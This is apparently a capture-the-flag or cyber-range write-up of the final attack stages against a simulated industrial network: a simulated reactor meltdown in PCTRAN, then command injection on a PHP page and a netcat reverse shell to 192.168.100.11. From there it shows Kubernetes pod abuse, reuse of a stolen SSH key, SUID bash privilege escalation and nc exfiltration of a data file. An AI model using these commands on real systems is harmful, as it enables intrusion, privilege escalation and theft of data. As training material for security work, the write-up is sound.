# Actions On Objectives

- [Actions On Objectives](#actions-on-objectives)
  - [Objective 1: Nuclear Meltdown](#objective-1-nuclear-meltdown)
  - [Host Discovery in the subnet 10.2.1.0/24](#host-discovery-in-the-subnet-1021024)
  - [Remote Command Execution on 10.2.1.2](#remote-command-execution-on-10212)
  - [Local Enumeration - 10.2.1.2](#local-enumeration---10212)
  - [Kubernetes Enumerations](#kubernetes-enumerations)
  - [Local Enumeration - Sensitive Pod](#local-enumeration---sensitive-pod)
  - [Local Enumeration & Privilege Escalation - Data-Master](#local-enumeration--privilege-escalation---data-master)
  - [Objective 2: Exfiltrate critical information on one of the air-gapped networks](#objective-2-exfiltrate-critical-information-on-one-of-the-air-gapped-networks)

----

## Objective 1: Nuclear Meltdown

Recalling the objectives:

> 1. Cause Nuclear Meltdown (detrimental-state)<br/>
> 2. Exfiltrate critical information on one of the air-gapped networks

<br/>

First launch **Reactor Controller** on the **scada-host**:

![picture 62](images/53eb0ce83ed2b2a49000874ca2f80494a4db1995aac3b6bdbd1041db2a74decf.png)  

<br/>

With reference to the **Core_Reactor_notes** found on the jump-server, try to cause a Nuclear Meltdown:

```
With access to PCTRAN control panel, the following procedure can replicate 
NUCLEAR MELTDOWN in core's reactor.

Code Control > Malfunctions > set option 12 (Inadvertent Rod Withdrawl)


Modify Delay Time (5)
Failure Fraction (100)
Check the active box 


Then, RUN the application, in 5 seconds, a message "OVERFlow" appears.

CAUTION: Nuclear Meltdown could be achieved by following the above procedure. 
```

![picture 64](images/05ee83007650d604f5740672d03c579489f0c5ac921e3c0ad8e60136b6373bbe.png)  

![picture 65](images/778ade4ada8199707ace45cffd4ed87541cf95a82c7d205dc5641bf4d0fc4c98.png)  

<br/>

The behavior is the same as mentioned in the Core_Reactor_notes, which means we have successfully caused a Nuclear Meltdown.

<br/>
<br/>

## Host Discovery in the subnet 10.2.1.0/24

On the jump-server, perform a simple host discovery using `ping`:

```
for i in {1..254}; do ping 10.2.1.$i -c 1 -w 1 | grep "64 bytes"; done
```

![picture 66](images/85feceead439a25e09dbcf94f8970e7ccb9c65da904fddc99f1ceaae26ff54ae.png)  


<br/>

On the remote desktop, try to access http://10.2.1.2:

![picture 67](images/3f089a47f446ec22cf6b6d5aa3e9c3111ff24173a4a159797bb00689276cfb12.png)  

As shown in the error message, the PHP page uses `system()` call. It is likely to be accepting a parameter.

<br/>

## Remote Command Execution on 10.2.1.2

Try to append `?cmd=id`:

![picture 68](images/f2315e72a7a7535b09fe4cd8fa8e534172e9728b969bcb39002941dbd86dfd5e.png)  

As shown, this page is vulnerable to RCE. We can abuse this to obtain a reverse shell.

<br/>

Command:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100.11 8888 >/tmp/f

rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.100.11%208888%20%3E%2Ftmp%2Ff
```

<br/>

Launch a nc listener locally:

```
nc -nlvp 8888
```

<br/>

Then make a request on the remote desktop machine:

```
http://10.2.1.2/?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.100.11%208888%20%3E%2Ftmp%2Ff
```

![picture 69](images/648dfc442ad40ba3cb5367c3c0a3e6fabd36729d3ca156fa6c3cfb48566a13af.png)  

<br/>

A reverse shell calls back to the `nc` listener:

![picture 70](images/ff1c6e6a176e69bf41b206a9b84dea878903184a04b1d827660abc0c080bac9d.png)  

![picture 92](images/c5e943399c6ec01b3a5a52d5016a2f89eaac76a8e9bf983ec9623314e7f52dd6.png)  

<br/>

## Local Enumeration - 10.2.1.2

Checking the `/etc/hosts` file:

```
cat /etc/hosts
```

![picture 71](images/1b1f496c7d49a103eb2d082b40f38ed06739f3ecc750495c83d86b0483b95cc1.png)  

Note the statement `Kubernetes-managed hosts file` - this is likely to be a pod in Kubernetes.

<br/>

Checking the Kernel version:

```
cat /etc/issue && uname -a
```

![picture 72](images/5aea5160ec446bd9ce9712de7485667ea50e4fa3e7795845b5806bf6a5d97fb6.png)  

* Ubuntu 16.04 image
* Kernel: 4.15.0-106-generic

<br/>

Also check the mount:

```
mount
```

![picture 73](images/2b0d9857bd317718ddbe0219e830d5795d4727a695eb287d1ddf64bbeda47bb2.png)  

![picture 74](images/b29c4cad7fcdf7afbd1c599931610529f6fc46de69240f859450bef775fce910.png)  

* There is an interesting mount `tmpfs` on `/run/secrets/kubernetes.io/serviceaccount`

<br/>

## Kubernetes Enumerations

First, on the attacker machine, download `kubectl`:

```
curl -LO "https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl"
```

<br/>

Then on the container, download `kubectl`:

```
cd /tmp && curl http://192.168.100.11/kubectl --output kubectl && chmod +x kubectl
```

![picture 75](images/14b0ac74718958720449e44479237a5c05156d844057999905ee6b8c2389ff1c.png)  

<br/>

Get PODs in the kubernetes cluster:

```
./kubectl get pods
```

![picture 76](images/70a7636e0a8f2c58e0b5003e0b077cd1a81a93ca23b41576e97d6ed0cb629586.png)  

<br/>

* There is an interesting pod called `sensitive-pod`.

<br/>

To enumerate the action allowed on the current container:

```
./kubectl auth can-i '*' '*' 
```

![picture 77](images/f7a396f565d5b4a5e2166da8c2971dc050b5d596d3bd245f165601cc70dc8235.png)  

* It means we can do everything in the current namespace.<br/>
(Ref: https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands)

<br/>

Hence we can access the `sensitive-pod`:

```
./kubectl exec -it sensitive-pod /bin/bash
```

![picture 78](images/dbdf85cb624317e71ed31d6a6b3c9ff22afdc5c1c197582520c2e1b5703d671a.png)  


<br/>

## Local Enumeration - Sensitive Pod 

Checking the file system related mount on the sensitive pod:

```
mount | grep sda
```

![picture 79](images/d23b44b6a603d42ea4f4cafd495fb7173ff8d045e26eb83ff5eda4940c1abca0.png)  

* The file system is mounted on `/root`.

<br/>

Checking the `/root` directory, it looks like a `/` directory of a file system.

```
ls -l /root
```

![picture 80](images/28c6841c7347ae03998ef066971f64fae4e7db66224bd26e1819137a40c70a25.png)  

<br/>

Checking the files in `/root/home`:

```
ls -lR /root/home/
```

![picture 81](images/3528be928f85204a00b39af91115966da68a9d982c2ed23dc61f704e5a4bad16.png)  

- 2 interesting files:
  - /root/home/data-slave/Desktop/ssh/id_rsa
  - /root/home/data-slave/Desktop/ssh/remote_access_info.txt  

<br/>

Inspect **remote_access_into.txt**:

```
cat /root/home/data-slave/Desktop/ssh/remote_access_info.txt  
```

![picture 82](images/18beaa3640a2a1e949c4ad5a91601036f0e7af029ec5669dd2d98df506820858.png)  

It reveals a host and the user:

- host: `data-master`
- user: `data-master`

<br/>

Check the file /root/etc/hosts:

```
cat /root/etc/hosts
```

![picture 83](images/e6db420173e4ec8cf298de44530a46c0946798b807bd7f39de2585ffd5b4cbb3.png)  

This reveals the IP address of the host `data-master` to be `10.2.1.2`

<br/>

With the SSH private key `/root/home/data-slave/Desktop/ssh/id_rsa`, try to access 10.2.1.2 via SSH:

```
ssh -i /root/home/data-slave/Desktop/ssh/id_rsa data-master@10.2.1.2
```

![picture 84](images/a2bf1a1523a522ed67a9d99418e856c87172482f3cce3c51807640a31079f754.png)  

* As shown, we have successfully access `data-master`.

<br/>

## Local Enumeration & Privilege Escalation - Data-Master

Checking the current user directory, there is a file called `cron.sh`. Inspect its content:

```
cat cron.sh
```

![picture 85](images/98be80149f4248b7363ad4e79dcdd3116f5158c10b27ef2bd95484a5ce12b80d.png)  

<br/>

Try to inspect the executable `bash` in the tmp file:

```
ls -la /tmp/bash
```

![picture 86](images/9e1a3e7741b804d3af064a536513f81110299b916c460df868dd1662703a16f2.png)  

<br/>

By abusing `/tmp/bash`, we can become root:

```
/tmp/bash -p
```

![picture 87](images/2cc4e74db952700ce715300113069ec9283f54df80b218d9dda3ebc1c739e9b5.png)  

<br/>

## Objective 2: Exfiltrate critical information on one of the air-gapped networks

Checking the directory `/root`, there is a file called `Critical-Data.xlsx`:

![picture 88](images/b2eb6373c82b0f8c53b0eaf7ef8803eaf3ba34ed26057dfce3ef321b76343439.png)  

<br/>

Check the MD5 hash of the file:

```
md5sum Critical-Data.xlsx
```

![picture 89](images/ecfdb62e131c8afe0a2673845196c8dbe8e0b31ea8e8da8cd9d7e8e2170f2fc9.png)  

* `905fe276a72c005fd6b5063bc6a5c51c`

<br/>

Since `nc` is available, we will use it to exfiltrate the file.

<br/>

First launch a `nc` listener on the local machine:

```
nc -nlvp 1234 > Critical-Data.xlsx && md5sum Critical-Data.xlsx
```

<br/>

Then on the `data-master` machine:

```
nc 192.168.100.11 1234 < Critical-Data.xlsx
```

![picture 90](images/5b03ece398ee48f7a9767edced347011000536236f4c3af180d38af1feb5b417.png)  

As shown, the critical information has been exfiltrated to the attacker machine.

<br/>

Inspect the content of the file:

![picture 91](images/815b1fc284a2a571955c8f3af392bc1585337c193924455f3b078885a3c61e67.png)  

